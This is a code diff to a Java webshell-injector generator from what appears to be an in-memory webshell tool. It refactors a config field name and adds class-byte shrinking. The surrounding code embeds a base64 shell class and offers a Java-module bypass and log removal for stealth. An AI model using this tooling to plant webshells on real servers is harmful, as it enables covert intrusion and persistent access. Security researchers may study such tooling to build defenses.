@@ -1,5 +1,6 @@
 package com.reajason.javaweb.memshell.generator;
 
+import com.reajason.javaweb.ClassBytesShrink;
 import com.reajason.javaweb.buddy.ByPassJavaModuleInterceptor;
 import com.reajason.javaweb.buddy.LogRemoveMethodVisitor;
 import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
@@ -22,11 +23,11 @@ import static net.bytebuddy.matcher.ElementMatchers.named;
  * @since 2024/11/24
  */
 public class InjectorGenerator {
-    private final ShellConfig config;
+    private final ShellConfig shellConfig;
     private final InjectorConfig injectorConfig;
 
-    public InjectorGenerator(ShellConfig config, InjectorConfig injectorConfig) {
-        this.config = config;
+    public InjectorGenerator(ShellConfig shellConfig, InjectorConfig injectorConfig) {
+        this.shellConfig = shellConfig;
         this.injectorConfig = injectorConfig;
     }
 
@@ -36,20 +37,20 @@ public class InjectorGenerator {
         DynamicType.Builder<?> builder = new ByteBuddy()
                 .redefine(injectorConfig.getInjectorClass())
                 .name(injectorConfig.getInjectorClassName())
-                .visit(new TargetJreVersionVisitorWrapper(config.getTargetJreVersion()))
+                .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()))
                 .method(named("getUrlPattern")).intercept(FixedValue.value(Objects.toString(injectorConfig.getUrlPattern(), "/*")))
                 .method(named("getBase64String")).intercept(FixedValue.value(base64String))
                 .method(named("getClassName")).intercept(FixedValue.value(injectorConfig.getShellClassName()));
 
-        if (config.needByPassJavaModule()) {
+        if (shellConfig.needByPassJavaModule()) {
             builder = ByPassJavaModuleInterceptor.extend(builder);
         }
 
-        if (config.isJakarta()) {
+        if (shellConfig.isJakarta()) {
             builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
         }
 
-        if (config.isDebugOff()) {
+        if (shellConfig.isDebugOff()) {
             builder = LogRemoveMethodVisitor.extend(builder);
         }
         return builder;
@@ -59,7 +60,7 @@ public class InjectorGenerator {
     public byte[] generate() {
         DynamicType.Builder<?> builder = getBuilder();
         try (DynamicType.Unloaded<?> make = builder.make()) {
-            return make.getBytes();
+            return ClassBytesShrink.shrink(make.getBytes(), shellConfig.isShrink());
         }
     }
 }
